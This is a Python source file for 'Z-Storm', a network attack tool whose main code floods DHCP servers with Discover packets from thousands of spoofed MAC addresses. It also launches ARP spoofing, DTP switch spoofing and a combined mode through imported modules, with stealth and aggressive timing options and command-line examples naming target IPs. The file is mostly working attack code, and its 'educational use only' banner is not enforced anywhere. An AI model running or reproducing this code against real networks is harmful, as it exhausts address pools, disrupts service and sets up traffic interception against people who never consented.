#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Z-Storm - Advanced Network Attack Framework
Developed by: Youssef Zedan

Features:
- DHCP Starvation Attack
- ARP Spoofing
- DTP Spoofing (Switch Spoofing)
- Auto Lab Automation
- Smart Scanner
- Advanced Reporting
"""

import os
import sys
import time
import yaml
import random
import logging
import threading
import argparse
import subprocess
from datetime import datetime
from typing import Dict, List, Optional

# ============================================================
# CHECK DEPENDENCIES (BUT DON'T BLOCK HELP)
# ============================================================

SCAPY_AVAILABLE = False
NETIFACES_AVAILABLE = False

try:
    import netifaces
    NETIFACES_AVAILABLE = True
except ImportError:
    pass

try:
    from scapy.all import (
        Ether, IP, UDP, BOOTP, DHCP,
        sendp, get_if_hwaddr, conf,
        ARP, srp
    )
    SCAPY_AVAILABLE = True
except ImportError:
    pass

# Import modules (will work after dependencies installed)
from modules.smart_scanner import SmartScanner
from modules.advanced_report import AdvancedReport
from modules.arp_spoof import ARPSpoofer
from modules.auto_lab import AutoLab
from modules.dtp_spoof import DTPSpoofer


class Colors:
    """ANSI color codes"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'


class ZStorm:
    """
    Z-Storm - Main attack framework
    Integrates all modules into one tool
    """
    
    def __init__(self, interface: str = "auto", config_file: str = "config.yaml"):
        """Initialize Z-Storm with all modules"""
        self.interface = interface or self._auto_detect_interface()
        self.config = self._load_config(config_file)
        
        # Initialize modules
        self.scanner = None
        self.arp_spoofer = None
        self.lab = None
        self.dtp_spoofer = None
        
        # Attack state
        self.running = False
        self.paused = False
        self.attack_mode = self.config.get('attack', {}).get('mode', 'intelligent')
        self.attack_type = self.config.get('attack', {}).get('type', 'dhcp_starvation')
        self.thread_count = self.config.get('attack', {}).get('threads', 5)
        self.max_macs = self.config.get('attack', {}).get('max_macs', 10000)
        self.delay_min = self.config.get('attack', {}).get('delay_min', 0.001)
        self.delay_max = self.config.get('attack', {}).get('delay_max', 0.01)
        
        # Statistics
        self.stats = {
            'packets_sent': 0,
            'macs_generated': 0,
            'threads_active': 0,
            'start_time': None,
            'end_time': None,
            'total_attack_time': 0,
            'packets_per_second': 0,
            'success': False
        }
        
        self.generated_macs = set()
        self.threads = []
        self.broadcast_mac = "ff:ff:ff:ff:ff:ff"
        self.broadcast_ip = "255.255.255.255"
        
        try:
            self.attacker_mac = get_if_hwaddr(self.interface)
        except:
            self.attacker_mac = "00:00:00:00:00:00"
        
        self._setup_logging()
        self._print_banner()
        self._log_info(f"Interface: {self.interface}")
        self._log_info(f"Attacker MAC: {self.attacker_mac}")
        self._log_info(f"Mode: {self.attack_mode}")
        self._log_info(f"Type: {self.attack_type}")
        self._log_info(f"Threads: {self.thread_count}")
    
    def _auto_detect_interface(self) -> str:
        """Auto-detect active network interface"""
        if NETIFACES_AVAILABLE:
            try:
                gateways = netifaces.gateways()
                if netifaces.AF_INET in gateways:
                    default_gw = gateways[netifaces.AF_INET][0]
                    interface = default_gw[1]
                    if interface != 'lo':
                        return interface
            except:
                pass
        
        try:
            if sys.platform == "linux":
                result = subprocess.run(
                    ["ip", "route", "show", "default"],
                    capture_output=True, text=True
                )
                for line in result.stdout.split('\n'):
                    if 'dev' in line:
                        return line.split('dev')[1].split()[0]
        except:
            pass
        return "eth0"
    
    def _load_config(self, config_file: str) -> dict:
        """Load configuration from YAML file"""
        default_config = {
            'attack': {
                'mode': 'intelligent',
                'type': 'dhcp_starvation',
                'threads': 5,
                'max_macs': 10000,
                'delay_min': 0.001,
                'delay_max': 0.01,
                'auto_detect_dhcp': True,
                'timeout': 300
            },
            'smart_scanner': {
                'enabled': True,
                'timeout': 5,
                'classify_devices': True
            },
            'reporting': {
                'enabled': True,
                'formats': ['json', 'html', 'markdown'],
                'include_network_info': True,
                'include_recommendations': True,
                'save_path': 'reports/'
            },
            'arp_spoofing': {
                'enabled': False,
                'target_ip': None,
                'gateway_ip': None,
                'interval': 2.0,
                'restore_on_exit': True
            },
            'dtp_spoofing': {
                'enabled': False,
                'target_mac': None,
                'interval': 5.0,
                'domain': 'z-storm-vlan',
                'status': 3,
                'vtp': 1,
                'neighbor': 1,
                'randomize_delay': False,
                'negotiate_desirable': True,
                'vlan_range': '1-4094'
            },
            'lab_automation': {
                'enabled': False,
                'lab_type': 'eve-ng',
                'auto_setup': True,
                'auto_cleanup': True
            },
            'logging': {
                'level': 'INFO',
                'file': 'zstorm.log',
                'max_size_mb': 10,
                'backup_count': 3,
                'console_output': True
            },
            'stealth': {
                'enabled': False,
                'randomize_delay': True,
                'spoof_mac': False,
                'randomize_mac_oui': True
            },
            'performance': {
                'batch_size': 100,
                'queue_size': 1000,
                'optimize_buffer': True
            },
            'security': {
                'ethical_use': True,
                'require_auth': False,
                'allowed_ips': [],
                'disable_dangerous': False
            }
        }
        
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8') as f:
                    config = yaml.safe_load(f)
                    for key in default_config:
                        if key not in config:
                            config[key] = default_config[key]
                    return config
            else:
                with open(config_file, 'w', encoding='utf-8') as f:
                    yaml.dump(default_config, f, default_flow_style=False)
                return default_config
        except Exception as e:
            print(f"[!] Error loading config: {e}")
            return default_config
    
    def _setup_logging(self):
        """Setup logging configuration"""
        log_file = self.config.get('logging', {}).get('file', 'zstorm.log')
        log_level = self.config.get('logging', {}).get('level', 'INFO')
        
        log_dir = os.path.dirname(log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir)
        
        logging.basicConfig(
            level=getattr(logging, log_level),
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file, encoding='utf-8'),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger('ZStorm')
    
    def _print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.BOLD}{Colors.CYAN}
███████╗    ███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
╚══███╔╝    ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
  ███╔╝     ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
 ███╔╝      ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
███████╗    ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
╚══════╝    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝

      {Colors.YELLOW}Z-Storm v2.0.0 - Advanced Network Attack Framework{Colors.END}
      {Colors.GREEN}Developed by: Youssef Zedan{Colors.END}
      {Colors.CYAN}Features: DHCP Starvation | ARP Spoofing | DTP Spoofing{Colors.END}

{Colors.BOLD}{Colors.RED}⚠️  FOR EDUCATIONAL USE ONLY - AUTHORIZED LAB ENVIRONMENTS{Colors.END}
{Colors.RED}🚫 UNAUTHORIZED USE IS PROHIBITED AND ILLEGAL{Colors.END}
{Colors.YELLOW}💡 Use -h or --help for usage information{Colors.END}
        """
        print(banner)
    
    def _log_info(self, message: str):
        self.logger.info(f"ℹ️ {message}")
    
    def _log_warning(self, message: str):
        self.logger.warning(f"⚠️ {message}")
    
    def _log_error(self, message: str):
        self.logger.error(f"❌ {message}")
    
    def _log_success(self, message: str):
        self.logger.info(f"✅ {message}")
    
    def _ensure_scapy(self) -> bool:
        """Ensure Scapy is installed, install if missing"""
        if SCAPY_AVAILABLE:
            return True
        
        self._log_warning("Scapy is not installed. Attempting automatic installation...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
            self._log_success("Scapy installed successfully. Please restart the command.")
            return False
        except Exception as e:
            self._log_error(f"Failed to install Scapy: {e}")
            self._log_info("Please install manually: pip install scapy")
            return False
    
    def scan_network(self) -> Dict:
        """Run smart scanner"""
        if not self._ensure_scapy():
            return {}
        
        print("\n" + "="*50)
        print("🔍 Smart Scanner")
        print("="*50)
        
        self.scanner = SmartScanner(
            interface=self.interface,
            timeout=self.config.get('smart_scanner', {}).get('timeout', 5)
        )
        network_info = self.scanner.scan_network()
        self.scanner.print_network_info()
        
        targets = self.scanner.get_attack_targets()
        print("\n🎯 Recommended targets:")
        print(f"   DHCP Servers: {targets['dhcp_servers']}")
        print(f"   Recommended attack: {targets['recommended_attack']}")
        
        return network_info
    
    def generate_intelligent_mac(self) -> str:
        """Generate random MAC address with real OUIs"""
        common_ouis = [
            [0x00, 0x0c, 0x29], [0x00, 0x50, 0x56], [0x00, 0x05, 0x69],
            [0x00, 0x1a, 0x11], [0x00, 0x1c, 0x42], [0x00, 0x1d, 0x71],
            [0x00, 0x1e, 0x68], [0x00, 0x15, 0x5d], [0x00, 0x03, 0x47],
            [0x00, 0x16, 0x3e], [0x08, 0x00, 0x27], [0x52, 0x54, 0x00]
        ]
        
        oui = random.choice(common_ouis)
        last_bytes = [
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff)
        ]
        
        mac = oui + last_bytes
        mac[0] |= 0x02
        mac[0] &= 0xfe
        
        mac_str = ":".join([f"{b:02x}" for b in mac])
        
        attempts = 0
        while mac_str in self.generated_macs and attempts < 100:
            mac[-1] = random.randint(0x00, 0xff)
            mac_str = ":".join([f"{b:02x}" for b in mac])
            attempts += 1
        
        self.generated_macs.add(mac_str)
        self.stats['macs_generated'] += 1
        
        return mac_str
    
    def create_dhcp_discover(self, client_mac: str, transaction_id: Optional[int] = None) -> Ether:
        """Create DHCP Discover packet"""
        if not SCAPY_AVAILABLE:
            self._log_error("Scapy not available. Please install: pip install scapy")
            return None
        
        if transaction_id is None:
            transaction_id = random.randint(0, 0xffffffff)
        
        client_mac_bytes = bytes.fromhex(client_mac.replace(":", ""))
        
        options = [
            ("message-type", "discover"),
            ("client_id", b"\x01" + client_mac_bytes),
            ("parameter_request_list", b"\x01\x02\x03\x04\x05\x06\x07\x08\x0f\x10\x12\x1a\x1b\x1c\x1f\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x30\x33\x36\x37\x39\x3a\x3b\x3c\x3d\x3e"),
            ("vendor_class_id", random.choice([b"MSFT 5.0", b"MSFT 6.0", b"Linux 2.4", b"Apple", b"Android"])),
            ("hostname", f"host-{random.randint(1000, 9999)}".encode()),
            ("max_size", 1500),
        ]
        
        if self.attack_mode == "intelligent":
            options.append(("lease_time", random.randint(86400, 604800)))
        
        options.append("end")
        
        ether = Ether(dst=self.broadcast_mac, src=client_mac, type=0x0800)
        ip = IP(src="0.0.0.0", dst=self.broadcast_ip)
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(
            op=1, htype=1, hlen=6, hops=0,
            xid=transaction_id, secs=random.randint(0, 60),
            flags=0x8000, ciaddr="0.0.0.0", yiaddr="0.0.0.0",
            siaddr="0.0.0.0", giaddr="0.0.0.0", chaddr=client_mac_bytes
        )
        dhcp = DHCP(options=options)
        
        return ether / ip / udp / bootp / dhcp
    
    def send_packet_thread(self, thread_id: int):
        """Packet sending thread for DHCP Starvation"""
        if not SCAPY_AVAILABLE:
            return
        
        local_count = 0
        
        while self.running:
            if self.paused:
                time.sleep(0.1)
                continue
            
            try:
                client_mac = self.generate_intelligent_mac()
                packet = self.create_dhcp_discover(client_mac)
                
                if packet is None:
                    continue
                
                sendp(packet, iface=self.interface, verbose=False)
                self.stats['packets_sent'] += 1
                local_count += 1
                
                if local_count % 100 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    rate = local_count / elapsed if elapsed > 0 else 0
                    self._log_info(
                        f"Thread {thread_id}: {local_count} packets - "
                        f"Rate: {rate:.1f}/s - "
                        f"Total: {self.stats['packets_sent']}"
                    )
                
                if self.attack_mode == "aggressive":
                    delay = random.uniform(self.delay_min, self.delay_min * 10)
                elif self.attack_mode == "stealth":
                    delay = random.uniform(self.delay_max / 2, self.delay_max)
                else:
                    delay = random.uniform(self.delay_min, self.delay_max)
                
                time.sleep(delay)
                
                if self.stats['macs_generated'] >= self.max_macs:
                    break
                
            except Exception as e:
                self._log_error(f"Error in thread {thread_id}: {e}")
                time.sleep(1)
        
        self.stats['threads_active'] -= 1
    
    def start_attack(self, network_info: Dict = None, save_report: bool = False, report_name: str = None):
        """Start the selected attack"""
        if not self._ensure_scapy():
            return
        
        print("\n" + "="*50)
        print("⚡ Starting Z-Storm Attack")
        print("="*50)
        
        if self.attack_type == "arp_spoofing" or self.config.get('arp_spoofing', {}).get('enabled', False):
            self._start_arp_spoofing(save_report, report_name)
        elif self.attack_type == "dtp_spoofing" or self.config.get('dtp_spoofing', {}).get('enabled', False):
            self._start_dtp_spoofing(save_report, report_name)
        elif self.attack_type == "combined":
            self._start_combined_attack(network_info, save_report, report_name)
        else:
            self._start_dhcp_attack(network_info, save_report, report_name)
    
    def _start_dhcp_attack(self, network_info: Dict, save_report: bool, report_name: str):
        """Start DHCP Starvation attack"""
        if network_info is None and self.config.get('smart_scanner', {}).get('enabled', True):
            network_info = self.scan_network()
        
        self.running = True
        self.stats['start_time'] = time.time()
        self.stats['threads_active'] = self.thread_count
        
        self._log_info(f"DHCP Starvation attack started")
        self._log_info(f"Mode: {self.attack_mode}")
        self._log_info(f"Threads: {self.thread_count}")
        self._log_info("Press Ctrl+C to stop")
        
        for i in range(self.thread_count):
            thread = threading.Thread(
                target=self.send_packet_thread,
                args=(i,),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            time.sleep(0.05)
        
        try:
            while self.running:
                time.sleep(1)
                elapsed = time.time() - self.stats['start_time']
                rate = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
                
                print(f"\r{Colors.CYAN}📊 Packets: {self.stats['packets_sent']} | "
                      f"MACs: {self.stats['macs_generated']} | "
                      f"Rate: {rate:.1f}/s | "
                      f"Time: {elapsed:.1f}s{Colors.END}", end="")
                
        except KeyboardInterrupt:
            print("\n")
            self._log_info("Attack stopped by user")
            self.stop_attack()
        
        if save_report:
            self._generate_report(network_info, report_name)
    
    def _start_arp_spoofing(self, save_report: bool, report_name: str):
        """Start ARP Spoofing attack"""
        self._log_info("ARP Spoofing attack started")
        
        if self.arp_spoofer is None:
            self.arp_spoofer = ARPSpoofer(
                interface=self.interface,
                target_ip=self.config['arp_spoofing']['target_ip'],
                gateway_ip=self.config['arp_spoofing']['gateway_ip'],
                interval=self.config['arp_spoofing']['interval']
            )
        
        try:
            self.arp_spoofer.start()
        except KeyboardInterrupt:
            self._log_info("ARP Spoofing stopped by user")
        except Exception as e:
            self._log_error(f"ARP Spoofing error: {e}")
        finally:
            if save_report:
                self._generate_report(None, report_name)
    
    def _start_dtp_spoofing(self, save_report: bool, report_name: str):
        """Start DTP Spoofing attack"""
        self._log_info("DTP Spoofing attack started")
        
        if self.dtp_spoofer is None:
            self.dtp_spoofer = DTPSpoofer(
                interface=self.interface,
                config=self.config.get('dtp_spoofing', {})
            )
        
        try:
            self.dtp_spoofer.start()
        except KeyboardInterrupt:
            self._log_info("DTP Spoofing stopped by user")
        except Exception as e:
            self._log_error(f"DTP Spoofing error: {e}")
        finally:
            if save_report:
                self._generate_report(None, report_name)
    
    def _start_combined_attack(self, network_info: Dict, save_report: bool, report_name: str):
        """Start combined attack (DHCP + DTP)"""
        self._log_info("Combined attack started")
        
        if self.dtp_spoofer is None:
            self.dtp_spoofer = DTPSpoofer(
                interface=self.interface,
                config=self.config.get('dtp_spoofing', {})
            )
        
        dtp_thread = threading.Thread(target=self.dtp_spoofer.start, daemon=True)
        dtp_thread.start()
        
        self._start_dhcp_attack(network_info, save_report, report_name)
        
        if self.dtp_spoofer:
            self.dtp_spoofer.stop()
    
    def stop_attack(self):
        """Stop the attack"""
        self.running = False
        self.stats['end_time'] = time.time()
        self.stats['total_attack_time'] = self.stats['end_time'] - self.stats['start_time']
        self.stats['packets_per_second'] = self.stats['packets_sent'] / self.stats['total_attack_time'] if self.stats['total_attack_time'] > 0 else 0
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        if self.dtp_spoofer and self.dtp_spoofer.running:
            self.dtp_spoofer.stop()
        
        self._print_stats()
    
    def _print_stats(self):
        """Print attack statistics"""
        print("\n" + "="*50)
        print("📊 Attack Statistics")
        print("="*50)
        print(f"DHCP Packets sent: {self.stats['packets_sent']}")
        print(f"MACs generated: {self.stats['macs_generated']}")
        print(f"Duration: {self.stats['total_attack_time']:.2f}s")
        print(f"Rate: {self.stats['packets_per_second']:.1f} packets/s")
        print("="*50)
    
    def _generate_report(self, network_info: Dict = None, report_name: str = None):
        """Generate advanced report"""
        if not self.config.get('reporting', {}).get('enabled', True):
            return
        
        print("\n" + "="*50)
        print("📄 Generating Advanced Report")
        print("="*50)
        
        self.stats['success'] = self.stats['packets_sent'] > 1000
        
        attack_data = {
            'success': self.stats['success'],
            'attack': {
                'mode': self.attack_mode,
                'type': self.attack_type,
                'threads': self.thread_count,
                'interface': self.interface
            },
            'stats': self.stats
        }
        
        formats = self.config.get('reporting', {}).get('formats', ['json', 'html', 'markdown'])
        
        if report_name is None:
            report_name = self._generate_report_name()
        
        reports_dir = self.config.get('reporting', {}).get('save_path', 'reports/')
        if not os.path.exists(reports_dir):
            os.makedirs(reports_dir)
        
        original_cwd = os.getcwd()
        os.chdir(reports_dir)
        
        report = AdvancedReport(attack_data, network_info)
        files = report.generate(formats)
        
        renamed_files = {}
        for fmt, filepath in files.items():
            new_name = f"{report_name}.{fmt}"
            if os.path.exists(filepath):
                os.rename(filepath, new_name)
                renamed_files[fmt] = os.path.join(reports_dir, new_name)
        
        os.chdir(original_cwd)
        
        print("\n📁 Report files:")
        for fmt, filepath in renamed_files.items():
            print(f"   • {fmt}: {filepath}")
    
    def _generate_report_name(self) -> str:
        """Generate sequential report name"""
        base_name = "scan" if self.attack_type == "scan" else "attack"
        reports_dir = self.config.get('reporting', {}).get('save_path', 'reports/')
        
        existing_files = os.listdir(reports_dir) if os.path.exists(reports_dir) else []
        max_num = 0
        
        for file in existing_files:
            if file.startswith(base_name) and file.endswith('.json'):
                try:
                    num = int(file.split('_')[-1].split('.')[0])
                    if num > max_num:
                        max_num = num
                except:
                    pass
        
        return f"{base_name}_{max_num + 1}"


def main():
    """Main entry point with both short and long options"""
    parser = argparse.ArgumentParser(
        description="🌩️ Z-Storm - Advanced Network Attack Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  DHCP Starvation:
    sudo zstorm -i eth0

  ARP Spoofing (Short):
    sudo zstorm -i eth0 -Tp arp_spoofing -T 192.168.1.5 -G 192.168.1.1

  ARP Spoofing (Long):
    sudo zstorm -i eth0 --type arp_spoofing --target 192.168.1.5 --gateway 192.168.1.1

  DTP Spoofing (Short):
    sudo zstorm -i eth0 -Tp dtp_spoofing -D -d "vlan-100"

  DTP Spoofing (Long):
    sudo zstorm -i eth0 --type dtp_spoofing --dtp --dtp-domain "vlan-100"

  Combined Attack:
    sudo zstorm -i eth0 -Tp combined -D -r

  Network Scan:
    sudo zstorm -i eth0 -S -r
        """
    )
    
    # General Options
    parser.add_argument("-i", "--interface", help="Network interface (auto-detect)")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads (default: 5)")
    parser.add_argument("-c", "--config", default="config.yaml", help="Config file (default: config.yaml)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-V", "--version", action="version", version="Z-Storm v2.0.0", help="Show version")
    
    # Attack Type and Mode
    parser.add_argument("-Tp", "--type", 
                       choices=['dhcp_starvation', 'arp_spoofing', 'dtp_spoofing', 'combined'],
                       default='dhcp_starvation',
                       help="Attack type: dhcp_starvation, arp_spoofing, dtp_spoofing, combined")
    parser.add_argument("-M", "--mode",
                       choices=['basic', 'aggressive', 'stealth', 'intelligent'],
                       default='intelligent',
                       help="Attack mode: basic, aggressive, stealth, intelligent")
    
    # DHCP Options
    parser.add_argument("-Mx", "--max-macs", type=int, default=10000, help="Max MAC addresses (default: 10000)")
    parser.add_argument("-Dl", "--delay-min", type=float, default=0.001, help="Min delay (default: 0.001)")
    parser.add_argument("-Dh", "--delay-max", type=float, default=0.01, help="Max delay (default: 0.01)")
    
    # ARP Options
    parser.add_argument("-T", "--target", help="Target IP for ARP spoofing")
    parser.add_argument("-G", "--gateway", help="Gateway IP (auto-detected)")
    parser.add_argument("-I", "--interval", type=float, default=2.0, help="ARP interval (default: 2.0)")
    
    # DTP Options
    parser.add_argument("-D", "--dtp", action="store_true", help="Enable DTP Spoofing")
    parser.add_argument("-d", "--dtp-domain", default="z-storm-vlan", help="DTP domain name")
    parser.add_argument("-m", "--dtp-target", help="Target MAC for DTP")
    parser.add_argument("-n", "--dtp-interval", type=float, default=5.0, help="DTP interval (default: 5.0)")
    
    # Other Options
    parser.add_argument("-S", "--scan", action="store_true", help="Run network scan only")
    parser.add_argument("-r", "--report", action="store_true", help="Generate report")
    parser.add_argument("-R", "--report-name", help="Custom report name")
    
    args = parser.parse_args()
    
    # Check root
    if os.geteuid() != 0:
        print("[!] Root privileges required. Please run with sudo.")
        print("[!] Example: sudo zstorm -i eth0")
        sys.exit(1)
    
    # Initialize Z-Storm
    storm = ZStorm(
        interface=args.interface or "auto",
        config_file=args.config
    )
    
    # Apply settings
    if args.mode:
        storm.attack_mode = args.mode
    if args.threads:
        storm.thread_count = args.threads
    if args.type:
        storm.attack_type = args.type
    if args.max_macs:
        storm.max_macs = args.max_macs
    if args.delay_min:
        storm.delay_min = args.delay_min
        storm.config['attack']['delay_min'] = args.delay_min
    if args.delay_max:
        storm.delay_max = args.delay_max
        storm.config['attack']['delay_max'] = args.delay_max
    
    # ARP config
    if args.target:
        storm.config['arp_spoofing']['target_ip'] = args.target
        storm.config['arp_spoofing']['enabled'] = True
    if args.gateway:
        storm.config['arp_spoofing']['gateway_ip'] = args.gateway
    if args.interval:
        storm.config['arp_spoofing']['interval'] = args.interval
    
    # DTP config
    if args.dtp:
        storm.config['dtp_spoofing']['enabled'] = True
        if args.dtp_domain:
            storm.config['dtp_spoofing']['domain'] = args.dtp_domain
        if args.dtp_target:
            storm.config['dtp_spoofing']['target_mac'] = args.dtp_target
        if args.dtp_interval:
            storm.config['dtp_spoofing']['interval'] = args.dtp_interval
    
    if args.verbose:
        storm.logger.setLevel(logging.DEBUG)
    
    # Auto-detect gateway for ARP
    if args.type == 'arp_spoofing' and not storm.config['arp_spoofing']['gateway_ip']:
        try:
            if NETIFACES_AVAILABLE:
                gateways = netifaces.gateways()
                if netifaces.AF_INET in gateways:
                    gw = gateways[netifaces.AF_INET][0][0]
                    storm.config['arp_spoofing']['gateway_ip'] = gw
                    storm._log_success(f"Auto-detected Gateway: {gw}")
        except:
            pass
    
    # Scan only
    if args.scan:
        network_info = storm.scan_network()
        if args.report:
            storm._generate_report(network_info, args.report_name or "scan")
        sys.exit(0)
    
    # Start attack
    try:
        storm.start_attack(save_report=args.report, report_name=args.report_name)
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        storm.stop_attack()


if __name__ == "__main__":
    main()
